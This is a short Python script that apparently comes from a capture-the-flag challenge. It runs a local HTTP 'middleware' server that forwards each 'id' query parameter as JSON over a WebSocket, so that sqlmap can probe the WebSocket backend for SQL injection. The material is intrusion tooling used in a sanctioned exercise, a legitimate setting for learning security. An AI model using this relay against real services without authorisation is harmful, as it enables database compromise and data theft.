import websocket
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
import threading

ws_server = "ws://127.0.0.1/ws"
# ws_server = "wss://bountyrepo.ctf.intigriti.io/ws"
websocket_timeout = 15


def send_ws(payload):
    try:
        payload = unquote(payload).replace('"', '\'')
        data = '{"id":"%s"}' % payload

        response_data = None

        def ws_thread():
            nonlocal response_data
            try:
                ws = websocket.create_connection(ws_server)
                ws.send(data)
                response_data = ws.recv()
                ws.close()
            except Exception as e:
                print("WebSocket Error:", e)

        ws_thread = threading.Thread(target=ws_thread)
        ws_thread.start()
        ws_thread.join(timeout=websocket_timeout)

        if response_data:
            return response_data
        else:
            return ''

    except Exception as e:
        print("WebSocket Error:", e)
        return None


def middleware_server(host_port, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=', 1)[1]
            except IndexError:
                payload = False

            if payload:
                # id beginning with '-' causes sqlmap to freeze!
                if payload.startswith('-'):
                    content = 'Skipped request due to negative "id"'
                else:
                    content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()

            if content:
                self.wfile.write(content.encode())
            else:
                self.wfile.write(b"Error in WebSocket connection")

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    print("[+] Starting MiddleWare Server")
    print("[+] Send payloads in http://localhost:9999/?id=*")

    try:
        middleware_server(('0.0.0.0', 9999))
    except KeyboardInterrupt:
        pass
